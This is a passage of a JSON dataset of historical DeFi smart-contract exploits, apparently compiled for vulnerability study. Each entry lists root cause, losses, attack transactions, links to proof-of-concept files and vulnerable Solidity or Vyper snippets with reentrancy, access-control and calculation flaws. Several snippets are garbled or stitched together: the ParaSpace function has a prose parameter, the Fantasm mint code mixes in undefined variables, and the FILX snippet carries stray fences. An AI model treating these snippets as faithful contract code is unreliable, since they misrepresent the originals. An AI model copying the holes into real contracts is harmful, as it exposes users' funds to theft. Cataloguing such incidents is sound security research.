        "vulnerable_code_snippet": "function depositAndBorrowAPEandStake(\n        DepositInfo memory depositInfo,\n        StakingInfo memory stakingInfo,\n        IAPECoinStaking.SingleMint[] calldata _nfts,\n        IApeCoinStaking.PairsList of paired NFT staking\n    ) external nonReentrant {\n        address userAddr = msg.sender;\n        address ptokenStaking = _getTokenStaking(stakingInfo.nftAsset);\n        if (stakingInfo.borrowAmount > 0) {\n            uint256 borrowRate = ApePool(pools).borrowRatePerBlock;\n            uint256 stakingRate = GetRewardRateBlock(stakingInfo.poolId, stakingInfo.borrowAmount);\n            IAPE(pool). borrow(userAddr, stakingInfo.borrowAmount);\n            IAPE(pool). safeTransferFrom(userAddr, ptokenStaking, stakingInfo.cashAmount);\n        }\n\n        _depositsInTokenHolding(userAddr, stakingInfo.nftAsset, depositInfo.mainTokenIds);\n        _depositsInTokenHolding(BACK_ADDR, depositInfo.backTokenIds);\n        // more code...\n    }"
    },
    {
        "type": "Access Control, wallet",
        "date": "20171106",
        "title": "Parity",
        "root_cause": "Incorrect access control",
        "attack_tx": null,
        "POC": "https://github.com/SunWeb3Sec/DeFiHackLabs#20171106-parity---accidentally-killed-it",
        "analysis": "Vulnerable code snippet: \n[https://etherscan.io/address/0x863df6bfa4469f3ead0be8f9f2aae51c91a907b4#code#L223](https://etherscan.io/address/0x863df6bfa4469f3ead0be8f9f2aae51c91a907b4#code#L223)\n\n```solidity\n// constructor - just pass on the owner array to the multiowned and\n  // the limit to daylimit\n  function initWallet(address[] _owners, uint _required, uint _daylimit) only_uninitialized { **//vulnerable point**\n    initDaylimit(_daylimit);\n    initMultiowned(_owners, _required);\n  }\n```",
        "lost": "514k ETH"
    },
    {
        "type": "Access Control",
        "date": "20240210",
        "title": "FILX DN404",
        "root_cause": "After registering a token, the owner is set to the message sender. the attacker takes advantage of this in the withdraw function where it then withdraws an arbitrary token from the contract which is the FLIX token. which it then swaps out ",
        "attack_tx": "https://etherscan.io/tx/0xbeef09ee9d694d2b24f3f367568cc6ba1dad591ea9f969c36e5b181fd301be82",
        "POC": "https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2024-02/DN404_exp.sol",
        "analysis": "vulnerable code snippet:\n```solidity\nfunction init(\n        IERC20 initToken,\n        uint256 initPeriods,\n        uint256 initInterval\n    ) public {\n        token = initToken;\n        periods = initPeriods;\n        interval = initInterval;\n        owner = _msgSender();\n    }\n```\n```solidity\nfunction withdraw(\n        IERC20 otherToken,\n        uint256 amount,\n        address receiver\n    ) public virtual onlyOwner {\n        uint256 currentBalance = otherToken.balanceOf(address(this));\n        require(receiver != address(0), \"receiver must not empty\");\n        require(currentBalance >= amount, \"current balance insufficient\");\n        otherToken.safeTransfer(receiver, amount);\n    }\n```",
        "lost": "200K",
        "vulnerable_code_snippet":"function init(\n        IERC20 initToken,\n        uint256 initPeriods,\n        uint256 initInterval\n    ) public {\n        token = initToken;\n        periods = initPeriods;\n        interval = initInterval;\n        owner = _msgSender();\n    }\n```\n```solidity\nfunction withdraw(\n        IERC20 otherToken,\n        uint256 amount,\n        address receiver\n    ) public virtual onlyOwner {\n        uint256 currentBalance = otherToken.balanceOf(address(this));\n        require(receiver != address(0), \"receiver must not empty\");\n        require(currentBalance >= amount, \"current balance insufficient\");\n        otherToken.safeTransfer(receiver, amount);\n    }"
    },
    {
        "type": "Flashloans, Miscalculation, staking",
        "date": "20230222",
        "lost": "$21k",
        "POC": "https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/DYNA_exp.sol",
        "title": "DYNA",
        "root_cause": "StakingDYNA contract does not handle the deposit time correctly. n the Contract, Users can deposit $DYNA to claim rewards, the interest is calculated based on the deposit duration. However, a vulnerability exists in the contract, as it fails to update the `lastProcessAt` parameter for any deposit. Consequently, the staking duration is miscalculated.",
        "attack_tx": [
            "https://bscscan.com/tx/0x06bbe093d9b84783b8ca92abab5eb8590cb2321285660f9b2a529d665d3f18e4",
            "https://bscscan.com/tx/0xc09678fec49c643a30fc8e4dec36d0507dae7e9123c270e1f073d335deab6cf0"
        ],
        "analysis": [
            "https://twitter.com/BeosinAlert/status/1628301635834486784",
            "https://twitter.com/BlockSecTeam/status/1628319536117153794"
        ],
        "vulnerable_code_snippet": "function deposit(uint256 _stakeAmount) external {\n\trequire(enabled, \"Staking is not enabled\");\n\trequire(\n\t\t_stakeAmount > 0,\n\t\t\"StakingDYlA: stake amount must be greater than 0\"\n\t);\n\ttoken.transferFrom(msg.sender, address(this), _stakeAmount);\n\tStakeDetail storage stakeDetail = stakers[msg.sender];\n\tif (stakeDetail.firstStakeAt == 0) {\n\t\tstakeDetail.principal = stakeDetail.principal.add(_stakeAmount);\n\t\tstakeDetail.firstStakeAt = stakeDetail.firstStakeAt == 0\n\t\t\t? block.timestamp\n\t\t\t: stakeDetail.firstStakeAt;\n\t\tStakeDetail.lastProcessAt = block.timestamp;\n\t} else {\n\t\tStakeDetail.principal = stakeDetail.principal.add(_stakeAmount); // Vulnerable Point: Does not update lastProcessAt.\n\t}\n\temit Deposit(msg.sender, _stakeAmount);\n}"

    },
    {
        "type": "Compiler Bug",
        "date": "20230730",
        "title": "Curve",
        "root_cause": "A bug within older versions of the `Vyper` compiler. it could cause a failure in a security feature used by a limited set of Curve pools",
        "attack_tx": "https://etherscan.io/tx/0xa84aa065ce61dbb1eb50ab6ae67fc31a9da50dd2c74eefd561661bfce2f1620c",
        "POC": "https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2023-07/Curve_exp01.sol",
        "analysis": "https://hackmd.io/@LlamaRisk/BJzSKHNjn",
        "lost": "$41M"
    },
    {
        "type": "Insufficient validation, Unchecked User Input",
        "date": "20240112",
        "title": "SocketGateway",
        "root_cause": "The exploit originated from wallets with unlimited approvals to Socket contracts, allowing the attacker to exploit vulnerabilities in the protocol's `performAction` function. This flaw enabled a call injection attack by allowing the insertion of malicious code into the `call()` function, compromising the contract's state and enabling unauthorized fund withdrawals.",
        "attack_tx": "https://etherscan.io/tx/0xc6c3331fa8c2d30e1ef208424c08c039a89e510df2fb6ae31e5aa40722e28fd6",
        "POC": "https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2024-01/SocketGateway_exp.sol",
        "analysis": "https://twitter.com/BeosinAlert/status/1747450173675196674",
        "lost": "3.3M",
          "vulnerable_code_snippet": "function performAction(\n        address fromToken,\n        address toToken,\n        uint256 amount,\n        address receiverAddress,\n        bytes32 metadata,\n        bytes calldata swapExtraData\n    ) external payable override returns (uint256) {\n        uint256 _initialBalanceTokenOut;\n        uint256 _finalBalanceTokenOut;\n\n        // Swap Native to Wrapped Token\n        if (fromToken == NATIVE_TOKEN_ADDRESS) {\n            _initialBalanceTokenOut = ERC20(toToken).balanceOf(socketGateway);\n            (bool success, ) = toToken.call{value: amount}(swapExtraData);\n\n            if (!success) {\n                revert SwapFailed();\n            }\n\n            _finalBalanceTokenOut = ERC20(toToken).balanceOf(socketGateway);\n\n            require(\n                (_finalBalanceTokenOut - _initialBalanceTokenOut) == amount,\n                \"Invalid wrapper contract\"\n            );\n\n            // Send weth to user\n            ERC20(toToken).transfer(receiverAddress, amount);\n        } else {\n            _initialBalanceTokenOut = address(socketGateway).balance;\n\n            // Swap Wrapped Token To Native Token\n            ERC20(fromToken).safeTransferFrom(\n                msg.sender,\n                socketGateway,\n                amount\n            );\n\n            (bool success, ) = fromToken.call(swapExtraData);\n\n            if (!success) {\n                revert SwapFailed();\n            }\n\n            _finalBalanceTokenOut = address(socketGateway).balance;\n\n            require(\n                (_finalBalanceTokenOut - _initialBalanceTokenOut) == amount,\n                \"Invalid wrapper contract\"\n            );\n\n            // send ETH to the user\n            payable(receiverAddress).transfer(amount);\n        }\n\n        emit SocketSwapTokens(\n            fromToken,\n            toToken,\n            amount,\n            amount,\n            Identifier,\n            receiverAddress,\n            metadata\n        );\n\n        return amount;\n    }"
    },
    {
        "type": "Access Control, Business Logic Flaw",
        "date": "20230317",
        "lost": "2,909 ETH",
        "POC": "https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/Paraspace_exp_2.sol",
        "title": "ParaSpace NFT",
        "root_cause": "There is a flawed logic in borrow() of the ParaProxy contract (0x638a98BBB92a7582d07C52ff407D49664DC8b3Ee) of  ParaSpace NFT. The attacker can borrow more tokens as his scaledBalance will be enlarged by depositing into the position of the proxy (0xC5c9fB6223A989208Df27dCEE33fC59ff5c26fFF), i.e., specifying the _recipient of depositApeCoin().",
        "vulnerable_code": "```solidity\nfunction depositApeCoin(uint256 _amount, address _recipient) public { //vulnerable point\n        if (_amount < MIN_DEPOSIT) revert DepositMoreThanOneAPE();\n        updatePool(APECOIN_POOL_ID);\n\n        Position storage position = addressPosition[_recipient]; //vulnerable point\n        _deposit(APECOIN_POOL_ID, position, _amount);\n\n        apeCoin.transferFrom(msg.sender, address(this), _amount);\n\n        emit Deposit(msg.sender, _amount, _recipient);\n    }\n```",
        "attack_tx": "https://etherscan.io/tx/0xe3f0d14cfb6076cabdc9057001c3fafe28767a192e88005bc37bd7d385a1116a",
        "analysis": "https://twitter.com/BlockSecTeam/status/1636650252844294144",
        "vulnerable_code_snippet":"function depositApeCoin(uint256 _amount, address _recipient) public { //vulnerable point\n        if (_amount < MIN_DEPOSIT) revert DepositMoreThanOneAPE();\n        updatePool(APECOIN_POOL_ID);\n\n        Position storage position = addressPosition[_recipient]; //vulnerable point\n        _deposit(APECOIN_POOL_ID, position, _amount);\n\n        apeCoin.transferFrom(msg.sender, address(this), _amount);\n\n        emit Deposit(msg.sender, _amount, _recipient);\n    }"
    },
    {
        "type": "Price Manipulation, Reentrancy",
        "date": "20230210",
        "lost": "$3.65M",
        "title": "dForce",
        "root_cause": "Read-only Reentrancy in   the `get_virtual_price` function of the Curve LP Oracle.",
        "poc": "https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/dForce_exp.sol",
        "attack_tx": [
            "https://arbiscan.io/tx/0x5db5c2400ab56db697b3cc9aa02a05deab658e1438ce2f8692ca009cc45171dd",
            "https://optimistic.etherscan.io/tx/0x6c19762186c9f32c81eb2a79420fc7ad4485aa916cab37ec278b216757bfba0d"
        ],
        "analysis": [
            "https://quillaudits.medium.com/decoding-dforce-protocol-read-only-reentrancy-exploit-quillaudits-c012aed4d666",
            "https://twitter.com/SlowMist_Team/status/1623956763598000129",
            "https://twitter.com/BlockSecTeam/status/1623901011680333824"
        ],
        "vulnerable_code_snippet": "@external\n@nonreentrant('lock')\ndef remove_liquidity(_amount: uint256, min_amounts: uint256[N_COINS]) -> uint256[N_COINS]:\n    \"\"\"\n    @notice Withdraw coins from the pool\n    @dev Withdrawal amounts are based on current deposit ratios\n    @param _amount Quantity of LP tokens to burn in the withdrawal\n    @param min_amounts Minimum amounts of underlying coins to receive\n    @return List of amounts of coins that were withdrawn\n    \"\"\"\n    _lp_token: address = self.lp_token\n    total_supply: uint256 = ERC20(_lp_token).totalSupply()\n    amounts: uint256[N_COINS] = empty(uint256[N_COINS])\n\n    for i in range(N_COINS):\n        _balance: uint256 = self.balances[i]\n        value: uint256 = _balance * _amount / total_supply\n        assert value >= min_amounts[i], \"Withdrawal resulted in fewer coins than expected\"\n        self.balances[i] = _balance - value\n        amounts[i] = value\n        if i == 0:\n            raw_call(msg.sender, b\"\", value=value) // @Vulnerable Point: Here, While Transferring ETH, LP tokens have not been burned. But the pool of ETH has been already reduced.\n        else:\n            assert ERC20(self.coins[1]).transfer(msg.sender, value)\n\n    CurveToken(_lp_token).burnFrom(msg.sender, _amount)  # Will raise if not enough\n\n    log RemoveLiquidity(msg.sender, amounts, empty(uint256[N_COINS]), total_supply - _amount)\n\n    return amounts"
    },
    {
        "type": "Miscalculation, Yield",
        "date": "20210915",
        "lost": "1.45 ETH",
        "POC": "https://github.com/SunWeb3Sec/DeFiHackLabs#20210915-nimbus-platform",
        "title": "Nimbus Platform",
        "root_cause": "Incorrect calculation. Inconsistent value in the code, 10000 vs 1000",
        "attack_tx": null,
        "analysis": "Vulnerable code snippet: same Uranium, NowSwap issue\ninconsistent value in the code, 10000 vs 1000\\n```solidity\n// this low-level function should be called from a contract which performs important safety checks\n    function swap(uint amount0Out, uint amount1Out, address to, bytes calldata data) external override lock {\n        require(amount0Out > 0 || amount1Out > 0, 'Nimbus: INSUFFICIENT_OUTPUT_AMOUNT');\n        (uint112 _reserve0, uint112 _reserve1,) = getReserves(); // gas savings\n        require(amount0Out < _reserve0 && amount1Out < _reserve1, 'Nimbus: INSUFFICIENT_LIQUIDITY');\n\n        uint balance0;\n        uint balance1;\n        { // scope for _token{0,1}, avoids stack too deep errors\n        address _token0 = token0;\n        address _token1 = token1;\n        require(to != _token0 && to != _token1, 'Nimbus: INVALID_TO');\n        if (amount0Out > 0) _safeTransfer(_token0, to, amount0Out); // optimistically transfer tokens\n        if (amount1Out > 0) _safeTransfer(_token1, to, amount1Out); // optimistically transfer tokens\n        if (data.length > 0) INimbusCallee(to).NimbusCall(msg.sender, amount0Out, amount1Out, data);\n        balance0 = IERC20(_token0).balanceOf(address(this));\n        balance1 = IERC20(_token1).balanceOf(address(this));\n        }\n        uint amount0In = balance0 > _reserve0 - amount0Out ? balance0 - (_reserve0 - amount0Out) : 0;\n        uint amount1In = balance1 > _reserve1 - amount1Out ? balance1 - (_reserve1 - amount1Out) : 0;\n        require(amount0In > 0 || amount1In > 0, 'Nimbus: INSUFFICIENT_INPUT_AMOUNT');\n\n        {\n        address referralProgram = INimbusFactory(factory).nimbusReferralProgram();\n        if (amount0In > 0) {\n            address _token0 = token0;\n            uint refFee = amount0In.mul(3)/ 1994;\n            _safeTransfer(_token0, referralProgram, refFee);\n            INimbusReferralProgram(referralProgram).recordFee(_token0, to, refFee);\n            balance0 = balance0.sub(refFee);\n        } \n        if (amount1In > 0) {\n            uint refFee = amount1In.mul(3) / 1994;\n            address _token1 = token1;\n            _safeTransfer(_token1, referralProgram, refFee);\n            INimbusReferralProgram(referralProgram).recordFee(_token1, to, refFee);\n            balance1 = balance1.sub(refFee);\n        }\n        }\n        \n        { // scope for reserve{0,1}Adjusted, avoids stack too deep errors\n        uint balance0Adjusted = balance0.mul(10000).sub(amount0In.mul(15)); **//vulnerable point**\n        uint balance1Adjusted = balance1.mul(10000).sub(amount1In.mul(15)); **//vulnerable point**\n        require(balance0Adjusted.mul(balance1Adjusted) >= uint(_reserve0).mul(_reserve1).mul(1000**2), 'Nimbus: K'); //vulnerable\n        }\n\n        _update(balance0, balance1, _reserve0, _reserve1);\n        emit Swap(msg.sender, amount0In, amount1In, amount0Out, amount1Out, to);\n    }\n```",
        "vulnerable_code_snippet": "// this low-level function should be called from a contract which performs important safety checks\n    function swap(uint amount0Out, uint amount1Out, address to, bytes calldata data) external override lock {\n        require(amount0Out > 0 || amount1Out > 0, 'Nimbus: INSUFFICIENT_OUTPUT_AMOUNT');\n        (uint112 _reserve0, uint112 _reserve1,) = getReserves(); // gas savings\n        require(amount0Out < _reserve0 && amount1Out < _reserve1, 'Nimbus: INSUFFICIENT_LIQUIDITY');\n\n        uint balance0;\n        uint balance1;\n        { // scope for _token{0,1}, avoids stack too deep errors\n        address _token0 = token0;\n        address _token1 = token1;\n        require(to != _token0 && to != _token1, 'Nimbus: INVALID_TO');\n        if (amount0Out > 0) _safeTransfer(_token0, to, amount0Out); // optimistically transfer tokens\n        if (amount1Out > 0) _safeTransfer(_token1, to, amount1Out); // optimistically transfer tokens\n        if (data.length > 0) INimbusCallee(to).NimbusCall(msg.sender, amount0Out, amount1Out, data);\n        balance0 = IERC20(_token0).balanceOf(address(this));\n        balance1 = IERC20(_token1).balanceOf(address(this));\n        }\n        uint amount0In = balance0 > _reserve0 - amount0Out ? balance0 - (_reserve0 - amount0Out) : 0;\n        uint amount1In = balance1 > _reserve1 - amount1Out ? balance1 - (_reserve1 - amount1Out) : 0;\n        require(amount0In > 0 || amount1In > 0, 'Nimbus: INSUFFICIENT_INPUT_AMOUNT');\n\n        {\n        address referralProgram = INimbusFactory(factory).nimbusReferralProgram();\n        if (amount0In > 0) {\n            address _token0 = token0;\n            uint refFee = amount0In.mul(3)/ 1994;\n            _safeTransfer(_token0, referralProgram, refFee);\n            INimbusReferralProgram(referralProgram).recordFee(_token0, to, refFee);\n            balance0 = balance0.sub(refFee);\n        } \n        if (amount1In > 0) {\n            uint refFee = amount1In.mul(3) / 1994;\n            address _token1 = token1;\n            _safeTransfer(_token1, referralProgram, refFee);\n            INimbusReferralProgram(referralProgram).recordFee(_token1, to, refFee);\n            balance1 = balance1.sub(refFee);\n        }\n        }\n        \n        { // scope for reserve{0,1}Adjusted, avoids stack too deep errors\n        uint balance0Adjusted = balance0.mul(10000).sub(amount0In.mul(15)); **//vulnerable point**\n        uint balance1Adjusted = balance1.mul(10000).sub(amount1In.mul(15)); **//vulnerable point**\n        require(balance0Adjusted.mul(balance1Adjusted) >= uint(_reserve0).mul(_reserve1).mul(1000**2), 'Nimbus: K'); //vulnerable\n        }\n\n        _update(balance0, balance1, _reserve0, _reserve1);\n        emit Swap(msg.sender, amount0In, amount1In, amount0Out, amount1Out, to);\n    }"
    },
    {
        "type": "DAO, MaliciosProposal",
        "date": "20220214",
        "title": "BuildFinance",
        "root_cause": "Malicious proposal",
        "POC": "https://github.com/SunWeb3Sec/DeFiHackLabs#20220214-buildfinance---dao",
        "analysis": "The attacker succeeded in the takeover by having a large enough vote in favour of the proposal and there were not enough countervotes to prevent the takeover from happening."
    },
    {
        "type": "Flashloans, Price Manipulation",
        "date": "20221210",
        "lost": "87 WBNB",
        "POC": "https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/TIFI_exp.sol",
        "title": "TIFIToken",
        "root_cause": "FlashLoan price manipulation.",
        "attack_tx": "https://explorer.phalcon.xyz/tx/bsc/0x1c5272ce35338c57c6b9ea710a09766a17bbf14b61438940c3072ed49bfec402",
        "analysis": "https://twitter.com/peckshield/status/1601492605535399936"
    },
    {
        "type": "Oracle",
        "date": "20240223",
        "title": "BlueberryProtocol",
        "root_cause": "Prices were being pulled from the PriceOracleProxy which passes calls through to the CoreOracle that is used on the Blueberry Strategies side. This, however, is an incorrect use of the system because the CoreOracle always returns prices scaled to 18 decimals, thus causing assets that have less than 18 decimals to be undervalued significantly when being borrowed.",
        "POC": "https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2024-02/BlueberryProtocol_exp.sol",
        "attack_tx": "https://etherscan.io/tx/0xf0464b01d962f714eee9d4392b2494524d0e10ce3eb3723873afd1346b8b06e4",
        "analysis": "https://twitter.com/blueberryFDN/status/1760865357236211964",
        "vulnerable_code_snippet": "pragma solidity 0.5.16;\n\nimport \"./PriceOracle.sol\";\nimport \"../BErc20.sol\";\n\ninterface IBaseOracle {\n    /// @dev Return the USD based price of the given input, multiplied by 10**18.\n    /// @param token The ERC-20 token to check the value.\n    function getPrice(address token) external view returns (uint256);\n}\n\ncontract PriceOracleProxy is PriceOracle {\n    IBaseOracle public baseOracle;\n\n    /**\n     * @param baseOracle_ The address of BlueBerry Core Oracle\n     */\n    constructor(IBaseOracle baseOracle_) public {\n        baseOracle = baseOracle_;\n    }\n\n    /**\n     * @notice Get the underlying price of a listed bToken asset\n     * @param bToken The bToken to get the underlying price of\n     * @return The underlying asset price mantissa (scaled by 1e18)\n     */\n    function getUnderlyingPrice(BToken bToken) public view returns (uint256) {\n        address underlying = BErc20(address(bToken)).underlying();\n        return baseOracle.getPrice(underlying);\n    }"
    },
    {
        "type": "Miscalculation",
        "date": "20201229",
        "title": "Cover Protocol",
        "root_cause": "Incorrect calculation via cached data. Pool data in storage but forgets to update the cached data. The outdated cached data is later used in calculations and that enables the hack.",
        "attack_tx": null,
        "POC": "https://github.com/SunWeb3Sec/DeFiHackLabs#20201229-cover-protocol",
        "analysis": "The vulnerable code snippet demonstrates that the `deposit` function uses cached data (`pool.lastUpdatedAt`) without updating it in real time. This outdated data is then used for calculations, leading to inaccurate reward distributions.\n\nThe `updatePool` function updates the `accRewardsPerToken` and `accBonusPerToken` values based on the current block timestamp. However, the `deposit`, `claimRewards` functions still rely on potentially outdated cached data for these calculations.\n\nThis discrepancy between cached data and live updates allows an attacker to exploit the system by manipulating the cached data.",
        "vulnerable_code": "https://etherscan.io/address/0xe0b94a7bb45dd905c79bb1992c9879f40f1caed5#code#F1#L115",
        "vulnerable_code_snippet": "function deposit(address _lpToken, uint256 _amount) external override {\n    require(block.timestamp >= START_TIME , \"Blacksmith: not started\");\n    require(_amount > 0, \"Blacksmith: amount is 0\");\n    Pool memory pool = pools[_lpToken];  //vulnerable point, data cached.\n    require(pool.lastUpdatedAt > 0, \"Blacksmith: pool does not exists\");\n    require(IERC20(_lpToken).balanceOf(msg.sender) >= _amount, \"Blacksmith: insufficient balance\");\n    updatePool(_lpToken);\n\n    Miner storage miner = miners[_lpToken][msg.sender];\n    BonusToken memory bonusToken = bonusTokens[_lpToken];\n    _claimCoverRewards(pool, miner); //old cached data used\n    _claimBonus(bonusToken, miner);\n\n    miner.amount = miner.amount.add(_amount);\n    // update writeoff to match current acc rewards/bonus per token\n    miner.rewardWriteoff = miner.amount.mul(pool.accRewardsPerToken).div(CAL_MULTIPLIER);  //vulnerable point, old cached data used\n    miner.bonusWriteoff = miner.amount.mul(bonusToken.accBonusPerToken).div(CAL_MULTIPLIER);  //vulnerable point, old cached data used\n\n    IERC20(_lpToken).safeTransferFrom(msg.sender, address(this), _amount);\n    emit Deposit(msg.sender, _lpToken, _amount);\n}"
    },
    {
        "type": "Incorrect logic",
        "date": "20221108",
        "lost": "$110k",
        "POC": "https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/Kashi_exp.sol",
        "title": "Kashi",
        "root_cause": "The `borrow` function uses the outdated `exchangeRate` to verify the borrowed share in the `solvent` modifier.",
        "attack_tx": "https://etherscan.io/tx/0x3d163bfbec5686d428a6d43e45e2626a220cc4fcfac7620c620b82c1f2537c78",
        "analysis": [
            "https://eigenphi.substack.com/p/casting-a-magic-spell-on-abracadabra",
            "https://twitter.com/BlockSecTeam/status/1603633067876155393"
        ],
        "vulnerable_code_snippet": "function _borrow(address to, uint256 amount) internal returns (uint256 part, uint256 share) {\n        uint256 feeAmount = amount.mul(BORROW_OPENING_FEE) / BORROW_OPENING_FEE_PRECISION; // A flat % fee is charged for any borrow\n\n        (totalBorrow, part) = totalBorrow.add(amount.add(feeAmount), true);\n        userBorrowPart[msg.sender] = userBorrowPart[msg.sender].add(part);\n        emit LogBorrow(msg.sender, to, amount, feeAmount, part);\n\n        share = bentoBox.toShare(asset, amount, false);\n        Rebase memory _totalAsset = totalAsset;\n        require(_totalAsset.base >= 1000, \"Kashi: below minimum\");\n        _totalAsset.elastic = _totalAsset.elastic.sub(share.to128());\n        totalAsset = _totalAsset;\n        bentoBox.transfer(asset, address(this), to, share);\n    }"

    },
    {
        "type": "Precision",
        "date": "20240711",
        "title": "GAX",
        "root_cause": "The attacker transferred 0 GAX and transferred out 49,583 USDT through the 0x6c99d7c8 method of the vulnerable contract.",
        "attack_tx": "https://bscscan.com/tx/0x368f842e79a10bb163d98353711be58431a7cd06098d6f4b6cbbcd4c77b53108",
        "POC": "https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2024-07/GAX_exp.sol",
        "analysis": "https://x.com/EXVULSEC/status/1811348160851378333",
        "vulnerable_code": "https://bscscan.com/address/0xdb4b73Df2F6dE4AFCd3A883efE8b7a4B0763822b#code",
        "lost": "$50K",
        "vulnerable_code_snippet": "function 0x6C99d7c8(uint256 var0, uint256 var1, bool var2) public nonPayable {\n    require(4 * (msg.data.length - 4) - 4 == 96);\n    if (var2) {\n        0x274f(var1, msg.sender, _uSDT);\n    } else {\n        emit 0x5d3444bfaab188d0ba45fc0d9479e2846405822e46b52e584cac2cc080f(msg.sender, owner_6_0_19, stor_4_0_19, var0, var1);\n    }\n}"
    },
    {
        "type": "Reentrancy",
        "date": "20230612",
        "title": "Sturdy Finance",
        "root_cause": "`setUserUseReserveAsCollateral()` enables users to toggle whether or not an asset is used as collateral.",
        "attack_tx": "https://etherscan.io/tx/0xeb87ebc0a18aca7d2a9ffcabf61aa69c9e8d3c6efade9e2303f8857717fb9eb7",
        "POC": "https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2023-06/Sturdy_exp.sol",
        "analysis": "https://sturdyfinance.medium.com/exploit-post-mortem-49261493307a",
        "lost": "$800k"
    },
    {
        "type": "Bridge, CrossChain, Insufficient validation",
        "date": "20220206",
        "title": "Meter",
        "root_cause": "insufficient validation",
        "POC": "https://github.com/SunWeb3Sec/DeFiHackLabs#20220206-meter---bridge",
        "analysis": null,
        "attack_tx": null,
        "lost": "$4.3 M",
        "vulnerable_code_snippet": "address tokenAddress = _resourceIDToTokenContractAddress[resourceID];\nrequire(_contractWhiteList[tokenAddress], \"provided tokenAddress is not whitelisted\");\n\nif (tokenAddress != _wTokenAddress) {\n    if (_burnList[tokenAddress]) {\n        burnERC20(tokenAddress, depositer, amount);\n    } else {\n        lockERC20(tokenAddress, depositer, address(this), amount);\n    }\n}"
    },
    {
        "type": "Access Control",
        "date": "20230529",
        "lost": "$2K",
        "POC": "https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/NOON_exp.sol",
        "title": "NOON (NO)",
        "root_cause": "Incorrect function visibility. The `_transfer` function has wrong visibility which does not follow standard ERC20 implentation.",
        "vulnerable_code_snippet": "function _transfer(address varg0, address varg1, uint256 varg2) public payable {  \\n//vulnerable point\\n    require(msg.data.length - 4 >= 96);\\n    require(varg1);\\n    require(varg2 <= _balanceOf[varg0]);\\n    require(_balanceOf[varg1] + varg2 > _balanceOf[varg1]);\\n    _balanceOf[varg0] = _balanceOf[varg0] - varg2;\\n    _balanceOf[varg1] += varg2;\\n    emit Transfer(varg0, varg1, varg2);\\n    assert(_balanceOf[varg1] + _balanceOf[varg0] == _balanceOf[varg0] + _balanceOf[varg1]);\\n}",
        "attack_tx": "https://explorer.phalcon.xyz/tx/eth/0x23fb7f093e827ed061aafb574cfd420eab879621c7f78cb341292e106a3a88c0",
        "analysis": "https://twitter.com/hexagate_/status/1663501545105702912"
    },
    {
        "type": "Miscalculation, Synthetic",
        "date": "20220309",
        "title": "Fantasm Finance",
        "root_cause": "Incorrect calculation due to wrong decimal. Due to the decimal PRECISION error, the _xftmOut is bigger than it is supposed to be.",
        "attack_tx": null,
        "POC": "https://github.com/SunWeb3Sec/DeFiHackLabs#20220309-fantasm-finance---business-logic-in-mint",
        "analysis": "Due to the decimal PRECISION error, the _xftmOut is bigger than it is supposed to be.\n\n```solidity\nfunction mint(uint256 _fantasmIn, uint256 _minXftmOut) external payable nonReentrant {\n        require(!mintPaused, \"Pool::mint: Minting is paused\");\n        uint256 _ftmIn = msg.value;\n        address _minter = msg.sender;\n\n        (uint256 _xftmOut, , uint256 _minFantasmIn, uint256 _ftmFee) = calcMint(\n            _ftmIn\n        );\n        require(_xftmOut >= _minXftmOut, \"Pool::mint: > slippage\");\n\n        WethUtils.wrap(_ftmIn);\nif (_yTokenOutTwap > 0 && _wethSwapIn > 0) {\n            WethUtils.weth.safeIncreaseAllowance(address(swapStrategy), _wethSwapIn);\nswapStrategy.execute(_wethSwapIn, _yTokenOutTwap);\n        }\n\n        if (_xTokenOut > 0) {\n            userInfo[_sender].xTokenBalance = userInfo[_sender].xTokenBalance + _xTokenOut;\nunclaimedXToken = unclaimedXToken + _xTokenOut;\n        }\n\n        transferToTreasury(_fee);\n\n        emit Mint(_sender, _xTokenOut, _ftmIn, _fee);\n    }\n\n/// @notice Calculate the expected results for zap minting\n    /// @param _ethIn Amount of Collateral token input.\n    /// @return _xTokenOut : the amount of XToken output.\n    /// @return _yTokenOutTwap : the amount of YToken output by swapping based on TWAP\n    /// @return _ethFee : the fee amount in Collateral token.\n    /// @return _ethSwapIn : the amount of Collateral token to swap\nfunction calcMint(uint256 _ethIn)\n        public\n        view\n        returns (\n            uint256 _xTokenOut,\n            uint256 _yTokenOutTwap,\n            uint256 _ethFee,\n            uint256 _ethSwapIn\n        ) {\n        uint256 _yTokenTwap = oracle.getYTokenTWAP();\n        require(_yTokenTwap > 0, \"Pool::calcMint: Invalid YToken price\");\n        _ethSwapIn = (_ethIn * (COLLATERAL_RATIO_MAX - collateralRatio)) / COLLATERAL_RATIO_MAX;\n        _yTokenOutTwap = (_ethSwapIn * PRICE_PRECISION) / _yTokenTwap;\n        _ethFee = (_ethIn * mintingFee * collateralRatio) / COLLATERAL_RATIO_MAX / PRECISION;\n        _xTokenOut = _ethIn - ((_ethIn * mintingFee) / PRECISION);\n    }\n```",
        "fixed": "https://ftmscan.com/address/0xa3B99CdFdDe2216AfB1D58D6108cC93fea413A76#code",
